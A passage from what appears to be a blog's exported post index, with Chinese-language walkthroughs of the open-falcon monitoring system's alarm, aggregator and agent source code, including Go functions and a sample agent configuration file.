{\n\t\tconsumeLowEvents(event, action)\n\t}\n}\n```\n\nconsumeHighEvents函数最终会调用WriteMaiModel函数最终写入到redis队列中去：\n\n```go\nfunc WriteMailModel(mail *model.Mail) {\n\tif mail == nil {\n\t\treturn\n\t}\n\n\tbs, err := json.Marshal(mail)\n\tif err != nil {\n\t\tlog.Error(err)\n\t\treturn\n\t}\n\n\tlog.Debugf(\"write mail to queue, mail:%v, queue:%s\", mail, MAIL_QUEUE_NAME)\n\tlpush(MAIL_QUEUE_NAME, string(bs))\n}\n```\n\n```go\nfunc combineMail() {\n\tdtos := popAllMailDto()\n\tcount := len(dtos)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tdtoMap := make(map[string][]*MailDto)\n\tfor i := 0; i < count; i++ {\n\t\tkey := fmt.Sprintf(\"%d%s%s%s\", dtos[i].Priority, dtos[i].Status, dtos[i].Email, dtos[i].Metric)\n\t\tif _, ok := dtoMap[key]; ok {\n\t\t\tdtoMap[key] = append(dtoMap[key], dtos[i])\n\t\t} else {\n\t\t\tdtoMap[key] = []*MailDto{dtos[i]}\n\t\t}\n\t}\n\n\t// 不要在这处理，继续写回redis，否则重启alarm很容易丢数据\n\tfor _, arr := range dtoMap {\n\t\tsize := len(arr)\n\t\tif size == 1 {\n\t\t\tredi.WriteMail([]string{arr[0].Email}, arr[0].Subject, arr[0].Content)\n\t\t\tcontinue\n\t\t}\n\n\t\tsubject := fmt.Sprintf(\"[P%d][%s] %d %s\", arr[0].Priority, arr[0].Status, size, arr[0].Metric)\n\t\tcontentArr := make([]string, size)\n\t\tfor i := 0; i < size; i++ {\n\t\t\tcontentArr[i] = arr[i].Content\n\t\t}\n\t\tcontent := strings.Join(contentArr, \"\\r\\n\")\n\n\t\tlog.Debugf(\"combined mail subject:%s, content:%s\", subject, content)\n\t\tredi.WriteMail([]string{arr[0].Email}, subject, content)\n\t}\n}\n```\n\n设置以天为单位的过期删除事件，数据库中删除。\n\n```go\nfunc CleanExpiredEvent() {\n\tfor {\n\n\t\tretention_days := g.Config().Housekeeper.EventRetentionDays\n\t\tdelete_batch := g.Config().Housekeeper.EventDeleteBatch\n\n\t\tnow := time.Now()\n\t\tbefore := now.Add(time.Duration(-retention_days*24) * time.Hour)\n\t\teventmodel.DeleteEventOlder(before, delete_batch)\n\n\t\ttime.Sleep(time.Second * 60)\n\t}\n}\n```\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon aggregator源码分析","url":"/2020/01/21/aggregator源码分析/","content":"\n## open-falcon aggregator源码分析\n\n 主流程module/aggregator/main中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\t// 配置文件解析\n\tg.ParseConfig(*cfg)\n    // 数据库初始化\n\tdb.Init()\n\t// http服务启动，接口查询所有的cluster信息\n\tgo http.Start()\n    //定时更新cluster数据，并启动worker启动，用于计算平均指标数据\n\tgo cron.UpdateItems()\n\n\t// sdk configuration\n\tsender.Debug = g.Config().Debug\n\tsender.PostPushUrl = g.Config().Api.PushApi\n\n    // 数据推送\n\tsender.StartSender()\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\n主要功能在UpdateItems函数中：\n\n```go\nfunc updateItems() {\n\titems, err := db.ReadClusterMonitorItems()\n\tif err != nil {\n\t\treturn\n\t}\n\n\tdeleteNoUseWorker(items)\n\tcreateWorkerIfNeed(items)\n}\n```\n\n首先查询数据库ReadClusterMonitorItems，获取已经在监控中的集群信息。，然后删除没有用到的集群信息。\n\n```go\nfunc deleteNoUseWorker(m map[string]*g.Cluster) {\n\tdel := []string{}\n\tfor key, worker := range Workers {\n\t\tif _, ok := m[key]; !ok {\n\t\t\tworker.Drop()\n\t\t\tdel = append(del, key)\n\t\t}\n\t}\n\n\tfor _, key := range del {\n\t\tdelete(Workers, key)\n\t}\n}\n```\n\n如果还没有监控则创建worker任务：\n\n```go\nfunc createWorkerIfNeed(m map[string]*g.Cluster) {\n\tfor key, item := range m {\n\t\tif _, ok := Workers[key]; !ok {\n\t\t\tif item.Step <= 0 {\n\t\t\t\tlog.Println(\"[W] invalid cluster(step <= 0):\", item)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tworker := NewWorker(item)\n\t\t\tWorkers[key] = worker\n\t\t\tworker.Start() // 启动\n\t\t}\n\t}\n}\n```\n\n```go\nfunc (this Worker) Start() {\n\tgo func() {\n\t\ts1 := rand.NewSource(time.Now().UnixNano() * this.ClusterItem.Id)\n\t\tr1 := rand.New(s1)\n\t\t// 60s, step usually\n\t\tdelay := r1.Int63n(60000)\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"[I] after %5d ms, start worker %d\", delay, this.ClusterItem.Id)\n\t\t}\n\n\t\ttime.Sleep(time.Duration(delay) * time.Millisecond)\n\t\tthis.Ticker = time.NewTicker(time.Duration(this.ClusterItem.Step) * time.Second)\n\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase <-this.Ticker.C:\n\t\t\t\tWorkerRun(this.ClusterItem)\n\t\t\tcase <-this.Quit:\n\t\t\t\tif g.Config().Debug {\n\t\t\t\t\tlog.Println(\"[I] drop worker\", this.ClusterItem)\n\t\t\t\t}\n\t\t\t\tthis.Ticker.Stop()\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}()\n}\n```\n\n设置定时器执行函数WorkerRun\n\n```go\nfunc WorkerRun(item *g.Cluster) {\n\tdebug := g.Config().Debug\n\n\tnumeratorStr := cleanParam(item.Numerator)        //\n\tdenominatorStr := cleanParam(item.Denominator)\n\n\tif !expressionValid(numeratorStr) || !expressionValid(denominatorStr) {\n\t\tlog.Println(\"[W] invalid numerator or denominator\", item)\n\t\treturn\n\t}\n    // 判断包含$(需要解析\n\tneedComputeNumerator := needCompute(numeratorStr)\n\tneedComputeDenominator := needCompute(denominatorStr)\n\n\tif !needComputeNumerator && !needComputeDenominator {\n\t\tlog.Println(\"[W] no need compute\", item)\n\t\treturn\n\t}\n\n    // 解析算子\n\tnumeratorOperands, numeratorOperators, numeratorComputeMode := parse(numeratorStr, needComputeNumerator)\n\tdenominatorOperands, denominatorOperators, denominatorComputeMode := parse(denominatorStr, needComputeDenominator)\n\n    // 操作非法\n\tif !operatorsValid(numeratorOperators) || !operatorsValid(denominatorOperators) {\n\t\tlog.Println(\"[W] operators invalid\", item)\n\t\treturn\n\t}\n\t// 根据id获取hostname\n\thostnames, err := sdk.HostnamesByID(item.GroupId)\n\tif err != nil || len(hostnames) == 0 {\n\t\treturn\n\t}\n\n\tnow := time.Now().Unix()\n\t// 获取最新的数据点\n\tvalueMap, err := queryCounterLast(numeratorOperands, denominatorOperands, hostnames, now-int64(item.Step*2), now)\n\tif err != nil {\n\t\tlog.Println(\"[E]\", err, item)\n\t\treturn\n\t}\n\n\tvar numerator, denominator float64\n\tvar validCount int\n\t// 每个机器计算\n\tfor _, hostname := range hostnames {\n\t\tvar numeratorVal, denominatorVal float64\n\t\tvar err error\n\t\t// 需要计算分子\n\t\tif needComputeNumerator {\n\t\t\tnumeratorVal, err = compute(numeratorOperands, numeratorOperators, numeratorComputeMode, hostname, valueMap)\n\n\t\t\tif debug && err != nil {\n\t\t\t\tlog.Printf(\"[W] [hostname:%s] [numerator:%s] id:%d, err:%v\", hostname, item.Numerator, item.Id, err)\n\t\t\t} else if debug {\n\t\t\t\tlog.Printf(\"[D] [hostname:%s] [numerator:%s] id:%d, value:%0.4f\", hostname, item.Numerator, item.Id, numeratorVal)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t}\n\t\t// 需要计算分母\n\t\tif needComputeDenominator {\n\t\t\tdenominatorVal, err = compute(denominatorOperands, denominatorOperators, denominatorComputeMode, hostname, valueMap)\n\n\t\t\tif debug && err != nil {\n\t\t\t\tlog.Printf(\"[W] [hostname:%s] [denominator:%s] id:%d, err:%v\", hostname, item.Denominator, item.Id, err)\n\t\t\t} else if debug {\n\t\t\t\tlog.Printf(\"[D] [hostname:%s] [denominator:%s] id:%d, value:%0.4f\", hostname, item.Denominator, item.Id, denominatorVal)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t}\n\n\t\tif debug {\n\t\t\tlog.Printf(\"[D] hostname:%s  numerator:%0.4f  denominator:%0.4f  per:%0.4f\\n\", hostname, numeratorVal, denominatorVal, numeratorVal/denominatorVal)\n\t\t}\n\t\tnumerator += numeratorVal\n\t\tdenominator += denominatorVal\n\t\tvalidCount += 1\n\t}\n\t// 不需要要计算分子\n\tif !needComputeNumerator {\n\t\tif numeratorStr == \"$#\" {\n\t\t\tnumerator = float64(validCount)\n\t\t} else {\n\t\t\tnumerator, err = strconv.ParseFloat(numeratorStr, 64)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", numeratorStr, err, item.Id)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}\n\t// 不需要计算分母\n\tif !needComputeDenominator {\n\t\tif denominatorStr == \"$#\" {\n\t\t\tdenominator = float64(validCount)\n\t\t} else {\n\t\t\tdenominator, err = strconv.ParseFloat(denominatorStr, 64)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", denominatorStr, err, item.Id)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}\n\n\tif denominator == 0 {\n\t\tlog.Println(\"[W] denominator == 0, id:\", item.Id)\n\t\treturn\n\t}\n\n\tif validCount == 0 {\n\t\tlog.Println(\"[W] validCount == 0, id:\", item.Id)\n\t\treturn\n\t}\n\n\tif debug {\n\t\tlog.Printf(\"[D] hostname:all  numerator:%0.4f  denominator:%0.4f  per:%0.4f\\n\", numerator, denominator, numerator/denominator)\n\t}\n    // sender push推送集群数据，给agent节点推送数据，数据传输通过/v1/push转发到transfer,这个地方需要注意的！！！\n\tsender.Push(item.Endpoint, item.Metric, item.Tags, numerator/denominator, item.DsType, int64(item.Step))\n}\n```\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon agent源码分析","url":"/2020/01/21/agent源码分析/","content":"\n## open-falcon agent源码分析\n\n因为工作需要，将这个open-falcon代码逻辑需要整理清楚。有些部分需要定制修改。\n\n本篇文章主要是针对open-falcon 中agent模块进行分析。\n\n主流程再module/agent/module中\n\n```go\nfunc main() {\n\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tcheck := flag.Bool(\"check\", false, \"check collector\")\n\t//解析参数\n\tflag.Parse()\n\t\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *check {\n        // 检查当前系统磁盘cpu等信息，有问题就退出\n\t\tfuncs.CheckCollector()\n\t\tos.Exit(0)\n\t}\n\t//解析配置文件\n\tg.ParseConfig(*cfg)\n\n\tif g.Config().Debug {\n\t\tg.InitLog(\"debug\")\n\t} else {\n\t\tg.InitLog(\"info\")\n\t}\n\t// 初始化root目录\n\tg.InitRootDir()\n    // localip初始化其实就是检查hbs服务是否启动能够连接。同时根据hbs来获取本地ip\n\tg.InitLocalIp()\n    // 初始化rpc客户端\n\tg.InitRpcClients()\n\t// 构建需要抓取的指标数据\n\tfuncs.BuildMappers()\n\t// 定时更新cpu和disk状态历史数据\n\tgo cron.InitDataHistory()\n\t// 定时给hbs报告agent本机状态\n\tcron.ReportAgentStatus()\n    //同步插件，没咋用过\n\tcron.SyncMinePlugins()\n    //调用hbs rpc接口BuiltinMetrics来获取BuiltinMetrics数据。同步监控端口、路径、进程和URL\n\tcron.SyncBuiltinMetrics()\n    //定时检查信任ip\n\tcron.SyncTrustableIps()\n    //定时收集指标数据\n\tcron.Collect()\n\t//启动http接口方便查询\n\tgo http.Start()\n\n\tselect {}\n\n}\n```\n\n先来看下配置文件：\n\n```json\n{\n    \"debug\": true,\n    \"hostname\": \"\",         \n    \"ip\": \"\",\n    \"plugin\": {               # 插件\n        \"enabled\": false,\n        \"dir\": \"./plugin\",\n        \"git\": \"https://github.com/open-falcon/plugin.git\",\n        \"logs\": \"./logs\"\n    },\n    \"heartbeat\": {            # 心跳\n        \"enabled\": true,\n        \"addr\": \"127.0.0.1:6030\",\n        \"interval\": 60,\n        \"timeout\": 1000\n    },\n    \"transfer\": {             # 传输地址\n        \"enabled\": true,\n        \"addrs\": [\n            \"127.0.0.1:8433\",\n            \"127.0.0.1:8433\"\n        ],\n        \"interval\": 60,\n        \"timeout\": 1000\n    },\n    \"http\": {                # http\n        \"enabled\": true,\n        \"listen\": \":1988\",\n        \"backdoor\": false\n    },\n    \"collector\": {          # 收集接口数据\n        \"ifacePrefix\": [\"eth\", \"em\"],\n        \"mountPoint\": []\n    },\n    \"default_tags\": {\n    },\n    \"ignore\": {                    \n        \"cpu.busy\": true,\n        \"df.bytes.free\": true,\n        \"df.bytes.total\": true,\n        \"df.bytes.used\": true,\n        \"df.bytes.used.percent\": true,\n        \"df.inodes.total\": true,\n        \"df.inodes.free\": true,\n        \"df.inodes.used\": true,\n        \"df.inodes.used.percent\": true,\n        \"mem.memtotal\": true,\n        \"mem.memused\": true,\n        \"mem.memused.percent\": true,\n        \"mem.memfree\": true,\n        \"mem.swaptotal\": true,\n        \"mem.swapused\": true,\n        \"mem.swapfree\": true\n    }\n}\n\n```\n\n先来看看InitRootDir函数，主要获取了根目录，为了后续启动http拼接路径。\n\n```go\nfunc InitRootDir() {\n\tvar err error\n\tRoot, err = os.Getwd()\n\tif err != nil {\n\t\tlog.Fatalln(\"getwd fail:\", err)\n\t}\n}\n```\n\n获取函数InitLocalIp，该函数获取hbs连接。获取本地localip地址，主要为了能够后续给hbs发送心跳报告。\n\n```go\nfunc InitLocalIp() {\n\tif Config().Heartbeat.Enabled {\n\t\tconn, err := net.DialTimeout(\"tcp\", Config().Heartbeat.Addr, time.Second*10)\n\t\tif err != nil {\n\t\t\tlog.Println(\"get local addr failed !\")\n\t\t} else {\n\t\t\tLocalIp = strings.Split(conn.LocalAddr().String(), \":\")[0]\n\t\t\tconn.Close()\n\t\t}\n\t} else {\n\t\tlog.Println(\"hearbeat is not enabled, can't get localip\")\n\t}\n}\n```\n\n初始化hbs的rpc客户端连接：\n\n```go\nfunc InitRpcClients() {\n\tif Config().Heartbeat.Enabled {\n\t\tHbsClient = &SingleConnRpcClient{\n\t\t\tRpcServer: Config().Heartbeat.Addr,\n\t\t\tTimeout:   time.Duration(Config().Heartbeat.Timeout) * time.Millisecond,\n\t\t}\n\t}\n}\n```\n\n函数BuildMappers，构建指标函数，类似于将所有的指标函数注册到map中去。\n\n```go\nfunc BuildMappers() {\n\tinterval := g.Config().Transfer.Interval\n\tMappers = []FuncsAndInterval{\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tAgentMetrics,\n\t\t\t\tCpuMetrics,\n\t\t\t\tNetMetrics,\n\t\t\t\tKernelMetrics,\n\t\t\t\tLoadAvgMetrics,\n\t\t\t\tMemMetrics,\n\t\t\t\tDiskIOMetrics,\n\t\t\t\tIOStatsMetrics,\n\t\t\t\tNetstatMetrics,\n\t\t\t\tProcMetrics,\n\t\t\t\tUdpMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tDeviceMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tPortMetrics,\n\t\t\t\tSocketStatSummaryMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tDuMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tUrlMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tGpuMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t}\n}\n```\n\n函数InitDataHistory：\n\n```go\nfunc InitDataHistory() {\n\tfor {\n\t\tfuncs.UpdateCpuStat()  //更新cpu状态信息   方便后续统计的时候用到了。\n\t\tfuncs.UpdateDiskStats()  // 更新disk状态信息\n\t\ttime.Sleep(g.COLLECT_INTERVAL)  // 间隔\n\t}\n}\n```\n\n函数reportAgentStatus函数：\n\n```go\nfunc ReportAgentStatus() {\n\tif g.Config().Heartbeat.Enabled && g.Config().Heartbeat.Addr != \"\" {\n\t\tgo reportAgentStatus(time.Duration(g.Config().Heartbeat.Interval) * time.Second)\n\t}\n}\n```\n\nReportAgentStatus函数调用reportAgentStatus函数来类似做了一层公共方法转私有分封装：\n\n```go\nfunc reportAgentStatus(interval time.Duration) {\n\tfor {\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\thostname = fmt.Sprintf(\"error:%s\", err.Error())\n\t\t}\n\n\t\treq := model.AgentReportRequest{\n\t\t\tHostname:      hostname,\n\t\t\tIP:            g.IP(),\n\t\t\tAgentVersion:  g.VersionMsg(),\n\t\t\tPluginVersion: g.GetCurrPluginVersion(),\n\t\t}\n\n\t\tvar resp model.SimpleRpcResponse\n        // 调用hbs rpc接口reportStatus上传当前agent状态信息，问题如果agent节点挂了，那么后续可能是通过mock数据去检查了\n\t\terr = g.HbsClient.Call(\"Agent.ReportStatus\", req, &resp)\n\t\tif err != nil || resp.Code != 0 {\n\t\t\tlog.Println(\"call Agent.ReportStatus fail:\", err, \"Request:\", req, \"Response:\", resp)\n\t\t}\n\n\t\ttime.Sleep(interval)\n\t}\n}\n```\n\n类似的SyncMinPlugins函数：\n\n```go\nfunc SyncMinePlugins() {\n\tif !g.Config().Plugin.Enabled {\n\t\treturn\n\t}\n\n\tif !g.Config().Heartbeat.Enabled {\n\t\treturn\n\t}\n\n\tif g.Config().Heartbeat.Addr == \"\" {\n\t\treturn\n\t}\n\n\tgo syncMinePlugins()\n}\n```\n\n调用函数syncMinePlugins：\n\n```go\nfunc syncMinePlugins() {\n\n\tvar (\n\t\ttimestamp  int64 = -1\n\t\tpluginDirs []string\n\t)\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\treq := model.AgentHeartbeatRequest{\n\t\t\tHostname: hostname,\n\t\t}\n\n\t\tvar resp model.AgentPluginsResponse\n        // hbs rpc接口MinePlugins，用来获取MinePlugin插件信息\n\t\terr = g.HbsClient.Call(\"Agent.MinePlugins\", req, &resp)\n\t\tif err != nil {\n\t\t\tlog.Println(\"call Agent.MinePlugin fail:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Timestamp <= timestamp {\n\t\t\tcontinue\n\t\t}\n\n\t\tpluginDirs = resp.Plugins\n\t\ttimestamp = resp.Timestamp\n\t\t// 后续就是根据获取的插件信息目录等，启动相关的插件脚本，如果有自定义的插件需要抓取数据等，其实可以再这边写。\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"call Agent.MinePlugin:%v\\n\", resp)\n\t\t}\n\n\t\tif len(pluginDirs) == 0 {\n\t\t\tplugins.ClearAllPlugins()\n\t\t\tcontinue\n\t\t}\n\n\t\tdesiredAll := make(map[string]*plugins.Plugin)\n\t\tfilefmt_scripts := [][]string{}\n\t\tdirfmt_scripts := []string{}\n\n\t\tfor _, script_path := range pluginDirs {\n\t\t\t//script_path could be a DIR or a SCRIPT_FILE_WITH_OR_WITHOUT_ARGS\n\t\t\t//比如： sys/ntp/60_ntp.py(arg1,arg2) 或者 sys/ntp/60_ntp.py 或者 sys/ntp\n\t\t\t//1. 参数只对单个脚本文件生效，目录不支持参数\n\t\t\t//2. 如果某个目录下的某个脚本被单独绑定到某个机器，那么再次绑定该目录时，该文件会不会再次执行\n\t\t\tvar args string = \"\"\n\n\t\t\tre := regexp.MustCompile(`(.*)\\((.*)\\)`)\n\t\t\tpath_args := re.FindAllStringSubmatch(script_path, -1)\n\t\t\tif path_args != nil {\n\t\t\t\tscript_path = path_args[0][1]\n\t\t\t\targs = path_args[0][2]\n\t\t\t}\n\n\t\t\tabs_path := filepath.Join(g.Config().Plugin.Dir, script_path)\n\t\t\tif !file.IsExist(abs_path) {\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif file.IsFile(abs_path) {\n\t\t\t\tfilefmt_scripts = append(filefmt_scripts, []string{script_path, args})\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tdirfmt_scripts = append(dirfmt_scripts, script_path)\n\t\t}\n\n\t\ttaken := make(map[string]struct{})\n\t\tfor _, script_file := range filefmt_scripts {\n\t\t\tabs_path := filepath.Join(g.Config().Plugin.Dir, script_file[0])\n\t\t\t_, file_name := filepath.Split(abs_path)\n\t\t\tarr := strings.Split(file_name, \"_\")\n\t\t\tvar cycle int\n\t\t\tvar err error\n\t\t\tcycle, err = strconv.Atoi(arr[0])\n\t\t\tif err == nil {\n\t\t\t\tfi, _ := os.Stat(abs_path)\n\t\t\t\tplugin := &plugins.Plugin{FilePath: script_file[0], MTime: fi.ModTime().Unix(), Cycle: cycle, Args: script_file[1]}\n\t\t\t\tdesiredAll[script_file[0]+\"(\"+script_file[1]+\")\"] = plugin\n\t\t\t}\n\t\t\t//针对某个 hostgroup 绑定了单个脚本后，再绑定该脚本的目录时，会忽略目录中的该文件\n\t\t\ttaken[script_file[0]] = struct{}{}\n\t\t}\n\n\t\tfor _, script_path := range dirfmt_scripts {\n\t\t\tps := plugins.ListPlugins(strings.Trim(script_path, \"/\"))\n\t\t\tfor k, p := range ps {\n\t\t\t\tif _, ok := taken[k]; ok {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tdesiredAll[k] = p\n\t\t\t}\n\t\t}\n\n\t\tplugins.DelNoUsePlugins(desiredAll)\n\t\tplugins.AddNewPlugins(desiredAll)\n\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"current plugins:%v\\n\", plugins.Plugins)\n\t\t}\n\t}\n}\n```\n\n下面需要获取监控端口和路径：\n\n```go\nfunc SyncBuiltinMetrics() {\n\tif g.Config().Heartbeat.Enabled && g.Config().Heartbeat.Addr != \"\" {\n\t\tgo syncBuiltinMetrics()\n\t}\n}\n```\n\n```go\nfunc syncBuiltinMetrics() {\n\n\tvar timestamp int64 = -1\n\tvar checksum string = \"nil\"\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\tvar ports = []int64{}\n\t\tvar paths = []string{}\n\t\tvar procs = make(map[string]map[int]string)\n\t\tvar urls = make(map[string]string)\n\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\n\t\treq := model.AgentHeartbeatRequest{\n\t\t\tHostname: hostname,\n\t\t\tChecksum: checksum,\n\t\t}\n\n\t\tvar resp model.BuiltinMetricResponse\n        // 调用rpc接口获取监控端口和路径\n\t\terr = g.HbsClient.Call(\"Agent.BuiltinMetrics\", req, &resp)\n\t\tif err != nil {\n\t\t\tlog.Println(\"ERROR:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Timestamp <= timestamp {\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Checksum == checksum {\n\t\t\tcontinue\n\t\t}\n\n\t\ttimestamp = resp.Timestamp\n\t\tchecksum = resp.Checksum\n\n\t\tfor _, metric := range resp.Metrics {\n\n\t\t\tif metric.Metric == g.URL_CHECK_HEALTH {\n\t\t\t\tarr := strings.Split(metric.Tags, \",\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\turl := strings.Split(arr[0], \"=\")\n\t\t\t\tif len(url) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tstime := strings.Split(arr[1], \"=\")\n\t\t\t\tif len(stime) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tif _, err := strconv.ParseInt(stime[1], 10, 64); err == nil {\n\t\t\t\t\turls[url[1]] = stime[1]\n\t\t\t\t} else {\n\t\t\t\t\tlog.Println(\"metric ParseInt timeout failed:\", err)\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif metric.Metric == g.NET_PORT_LISTEN {\n\t\t\t\tarr := strings.Split(metric.Tags, \"=\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\n\t\t\t\tif port, err := strconv.ParseInt(arr[1], 10, 64); err == nil {\n\t\t\t\t\tports = append(ports, port)\n\t\t\t\t} else {\n\t\t\t\t\tlog.Println(\"metrics ParseInt failed:\", err)\n\t\t\t\t}\n\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif metric.Metric == g.DU_BS {\n\t\t\t\tarr := strings.Split(metric.Tags, \"=\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\n\t\t\t\tpaths = append(paths, strings.TrimSpace(arr[1]))\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif metric.Metric == g.PROC_NUM {\n\t\t\t\tarr := strings.Split(metric.Tags, \",\")\n\n\t\t\t\ttmpMap := make(map[int]string)\n\n\t\t\t\tfor i := 0; i < len(arr); i++ {\n\t\t\t\t\tif strings.HasPrefix(arr[i], \"name=\") {\n\t\t\t\t\t\ttmpMap[1] = strings.TrimSpace(arr[i][5:])\n\t\t\t\t\t} else if strings.HasPrefix(arr[i], \"cmdline=\") {\n\t\t\t\t\t\ttmpMap[2] = strings.TrimSpace(arr[i][8:])\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tprocs[metric.Tags] = tmpMap\n\t\t\t}\n\t\t}\n\n\t\tg.SetReportUrls(urls)\n\t\tg.SetReportPorts(ports)\n\t\tg.SetReportProcs(procs)\n\t\tg.SetDuPaths(paths)\n\n\t}\n}\n```\n\n获取信任IP列表：\n\n```go\nfunc syncTrustableIps() {\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\tvar ips string\n        // 调用hbs接口来获取信任ip列表，用于给http接口查询认证使用/\n\t\terr := g.HbsClient.Call(\"Agent.TrustableIps\", model.NullRpcRequest{}, &ips)\n\t\tif err != nil {\n\t\t\tlog.Println(\"ERROR: call Agent.TrustableIps fail\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tg.SetTrustableIps(ips)\n\t}\n}\n```\n\n收集指标数据collector\n\n```go\nfunc Collect() {\n\n\tif !g.Config().Transfer.Enabled {\n\t\treturn\n\t}\n\n\tif len(g.Config().Transfer.Addrs) == 0 {\n\t\treturn\n\t}\n\n\tfor _, v := range funcs.Mappers {\n\t\tgo collect(int64(v.Interval), v.Fs)\n\t}\n}\n```\n\n函数collect\n\n```go\nfunc collect(sec int64, fns []func() []*model.MetricValue) {\n\tt := time.NewTicker(time.Second * time.Duration(sec))\n\tdefer t.Stop()\n    // 根据获取到的map的指标的数组，去抓取数据\n\tfor {\n\t\t<-t.C\n\t\t// hostname\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tmvs := []*model.MetricValue{}\n         // 获取忽略指标\n\t\tignoreMetrics := g.Config().IgnoreMetrics\n\n\t\tfor _, fn := range fns {\n\t\t\titems := fn()\n\t\t\tif items == nil {\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif len(items) == 0 {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\t\n\t\t\tfor _, mv := range items {\n\t\t\t\tif b, ok := ignoreMetrics[mv.Metric]; ok && b {\n\t\t\t\t\tcontinue\n\t\t\t\t} else {\n\t\t\t\t\tmvs = append(mvs, mv)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tnow := time.Now().Unix()\n\t\tfor j := 0; j < len(mvs); j++ {\n\t\t\tmvs[j].Step = sec\n\t\t\tmvs[j].Endpoint = hostname\n\t\t\tmvs[j].Timestamp = now\n\t\t}\n\t\t// 发送数据到transfer\n\t\tg.SendToTransfer(mvs)\n\n\t}\n}\n```\n\n数据发送函数SendToTransfer：\n\n```go\nfunc SendToTransfer(metrics []*model.MetricValue) {\n\tif len(metrics) == 0 {\n\t\treturn\n\t}\n\n\tdt := Config().DefaultTags\n\tif len(dt) > 0 {\n\t\tvar buf bytes.Buffer\n\t\tdefault_tags_list := []string{}\n\t\tfor k, v := range dt 